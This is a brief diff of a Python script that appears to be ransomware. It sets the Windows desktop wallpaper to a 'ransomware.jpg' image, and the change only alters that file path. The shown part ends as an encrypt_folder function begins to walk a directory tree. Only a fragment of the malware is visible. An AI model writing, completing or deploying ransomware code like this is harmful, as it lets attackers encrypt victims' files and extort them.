@@ -45,7 +45,7 @@ def menu():
 option = menu()
 
 def change_wallpaper():
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, "c:/Users/fhopkins/ransomware.jpg" , 0)
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:/ransomware.jpg" , 0)
 
 def encrypt_folder(folder):
     for root, dirs, files in os.walk(folder, topdown=False):
